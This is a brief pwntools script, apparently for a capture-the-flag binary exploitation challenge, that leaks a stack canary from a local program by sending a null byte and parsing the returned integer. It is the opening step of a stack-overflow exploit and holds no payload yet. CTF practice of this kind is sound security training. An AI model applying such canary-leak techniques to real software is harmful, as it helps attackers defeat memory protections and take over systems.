from pwn import *
context.log_level="debug"

r=process("./chall")
elf=ELF("./chall")
libc=ELF("./x32_libc-2.23.so")

print r.pid
pause()

r.sendlineafter(">>","\x00")
a=r.recvline()[:-1]
a=int(a)
if a<0:
    a+=4294967296
print hex(a)
canary=a
r.recv()

r.interactive()
